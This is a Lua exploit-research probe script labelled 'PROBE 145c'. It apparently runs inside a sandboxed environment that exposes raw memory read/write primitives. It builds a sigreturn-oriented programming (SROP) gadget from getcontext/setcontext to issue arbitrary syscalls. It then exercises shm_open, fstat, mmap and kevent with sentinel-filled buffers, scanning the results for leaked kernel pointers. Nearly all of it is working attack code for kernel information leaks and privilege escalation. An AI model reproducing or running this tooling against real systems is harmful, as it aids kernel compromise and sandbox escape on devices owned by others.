-- CRASH_CLASS: LOW
-- PROBE 145c: Deep shm exploration + kevent stack scan + tty
--
-- shm_open works! Test SHM_LARGEPAGE, race conditions, kevent data

print("=== PROBE 145c: SHM DEEP + KEVENT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- [A] SHM deep testing
print("--- [A] SHM DEEP ---")
local name_buf = memory.alloc(32)

-- Create multiple shm objects
for idx = 0, 3 do
    local sn = "/tst" .. idx
    for i = 1, #sn do memory.write_byte(name_buf + i - 1, string.byte(sn, i)) end
    memory.write_byte(name_buf + #sn, 0)
    local rv = srop(482, uint64(name_buf), uint64(0x202), uint64(438))
    local fd = rv and to_num(rv) or -1
    print("shm" .. idx .. "=" .. fd)
    if fd >= 0 then
        -- ftruncate to PAGE size
        srop(480, uint64(fd), uint64(0x4000))

        -- SHM_GROW_ON_WRITE ioctl-like operation: fcntl with F_GETFL/F_SETFL
        local flags_rv = srop(92, uint64(fd), uint64(3))
        print("  fcntl_F_GETFL=" .. (flags_rv and tostring(to_num(flags_rv)) or "nil"))

        -- fstat the shm fd (sys 551 or 189)
        local st_buf = memory.alloc(256)
        for i = 0, 255, 4 do wd(st_buf + i, 0) end
        local fstat_rv = srop(551, uint64(fd), uint64(st_buf))
        local fstat_v = fstat_rv and to_num(fstat_rv) or -1
        print("  fstat=" .. fstat_v)

        if fstat_v == 0 then
            -- Scan fstat output for kernel pointers
            for off = 0, 128, 8 do
                local v = memory.read_qword(st_buf + off)
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 then
                    print("  *** KPTR at +" .. string.format("%02X", off) ..
                        "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
                end
            end
            -- Print some key stat fields
            local dev = to_num(memory.read_dword(st_buf))
            local ino = to_num(memory.read_dword(st_buf + 8))
            local mode = to_num(memory.read_dword(st_buf + 16))
            local size_lo = to_num(memory.read_dword(st_buf + 72))
            print("  dev=" .. dev .. " ino=" .. ino .. " mode=0x" ..
                string.format("%X", mode) .. " size=" .. size_lo)
        end

        -- mmap and write pattern
        local sc_mmap = make_syscall(477)
        local ok_m, m = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(0x0001), uint64(fd), uint64(0))
        end)
        if ok_m then
            local mh, ml = get_hi_lo(m)
            if ml ~= 0 or mh ~= 0 then
                -- Check if it's not MAP_FAILED
                if not (mh == 0xFFFFFFFF and ml == 0xFFFFFFFF) then
                    wd(m, 0xDEAD0000 + idx)
                    print("  map=0x" .. string.format("%X%08X", mh, ml) ..
                        " write_ok rd=0x" .. string.format("%08X", to_num(memory.read_dword(m))))
                end
            end
        end

        srop(6, uint64(fd))
        srop(483, uint64(name_buf))
    end
end

-- [B] kevent with EVFILT_PROC to detect uninitialized data
print("")
print("--- [B] KEVENT ---")
local kq_rv = srop(362)
local kq_fd = kq_rv and to_num(kq_rv) or -1
print("kqueue=" .. kq_fd)

if kq_fd >= 0 then
    local ev_buf = memory.alloc(512)
    local ts = memory.alloc(16)
    wq(ts, uint64(0))
    wq(ts + 8, uint64(0))

    -- Register EVFILT_TIMER=-7 with EV_ADD|EV_ONESHOT
    local ev_in = memory.alloc(64)
    wq(ev_in, uint64(42))            -- ident
    memory.write_word(ev_in + 8, 0xFFF9)  -- EVFILT_TIMER=-7 as uint16
    memory.write_word(ev_in + 10, 0x0011) -- EV_ADD|EV_ONESHOT
    wd(ev_in + 12, 0)
    wq(ev_in + 16, uint64(1))        -- 1ms timer
    wq(ev_in + 24, uint64(0x4141414141414141))

    local kev_add = srop(363, uint64(kq_fd), uint64(ev_in), uint64(1),
        uint64(0), uint64(0), uint64(ts))
    print("kevent_add=" .. (kev_add and tostring(to_num(kev_add)) or "nil"))

    -- Sleep 20ms
    local tw = memory.alloc(16)
    wq(tw, uint64(0))
    wq(tw + 8, uint64(20000000))
    pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

    -- Fill output with sentinels
    for i = 0, 511, 4 do wd(ev_buf + i, 0xCCCCCCCC) end

    -- Poll for events, requesting max 8
    local kev_poll = srop(363, uint64(kq_fd), uint64(0), uint64(0),
        uint64(ev_buf), uint64(8), uint64(ts))
    local nevt = kev_poll and to_num(kev_poll) or -1
    print("kevent_poll=" .. nevt)

    if nevt > 0 then
        for ev = 0, nevt - 1 do
            local base = ev_buf + ev * 32
            local line = "ev" .. ev .. ":"
            for off = 0, 31, 4 do
                local v = to_num(memory.read_dword(base + off))
                line = line .. " " .. string.format("%08X", v)
            end
            print(line)

            -- Check each qword for kernel pointers
            for off = 0, 24, 8 do
                local v = memory.read_qword(base + off)
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 then
                    print("*** KPTR ev" .. ev .. "+" .. string.format("%02X", off) ..
                        "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
                end
            end
        end
    end

    -- Also try EVFILT_READ on the kqueue fd itself
    wq(ev_in, uint64(kq_fd))
    memory.write_word(ev_in + 8, 0xFFFF) -- EVFILT_READ=-1
    memory.write_word(ev_in + 10, 0x0011)
    wd(ev_in + 12, 0)
    wq(ev_in + 16, uint64(0))
    wq(ev_in + 24, uint64(0x4242424242424242))

    -- Register multiple different filters
    local ev_multi = memory.alloc(256)
    local mcount = 0

    -- EVFILT_TIMER=-7 ident=100
    wq(ev_multi + mcount * 32, uint64(100))
    memory.write_word(ev_multi + mcount * 32 + 8, 0xFFF9)
    memory.write_word(ev_multi + mcount * 32 + 10, 0x0011)
    wd(ev_multi + mcount * 32 + 12, 0)
    wq(ev_multi + mcount * 32 + 16, uint64(1))
    wq(ev_multi + mcount * 32 + 24, uint64(0))
    mcount = mcount + 1

    -- EVFILT_TIMER=-7 ident=101
    wq(ev_multi + mcount * 32, uint64(101))
    memory.write_word(ev_multi + mcount * 32 + 8, 0xFFF9)
    memory.write_word(ev_multi + mcount * 32 + 10, 0x0011)
    wd(ev_multi + mcount * 32 + 12, 0)
    wq(ev_multi + mcount * 32 + 16, uint64(1))
    wq(ev_multi + mcount * 32 + 24, uint64(0))
    mcount = mcount + 1

    local kev_m = srop(363, uint64(kq_fd), uint64(ev_multi), uint64(mcount),
        uint64(0), uint64(0), uint64(ts))
    print("kevent_multi_add=" .. (kev_m and tostring(to_num(kev_m)) or "nil"))

    -- Sleep 20ms
    pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

    -- Collect - use 256 bytes of sentinel-filled buffer
    for i = 0, 511, 4 do wd(ev_buf + i, 0xDDDDDDDD) end
    local kev_m2 = srop(363, uint64(kq_fd), uint64(0), uint64(0),
        uint64(ev_buf), uint64(16), uint64(ts))
    local nevt2 = kev_m2 and to_num(kev_m2) or -1
    print("kevent_multi_poll=" .. nevt2)

    if nevt2 > 0 then
        for ev = 0, nevt2 - 1 do
            local base = ev_buf + ev * 32
            local line = "m" .. ev .. ":"
            for off = 0, 31, 4 do
                local v = to_num(memory.read_dword(base + off))
                line = line .. " " .. string.format("%08X", v)
            end
            print(line)
        end
    end

    srop(6, uint64(kq_fd))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
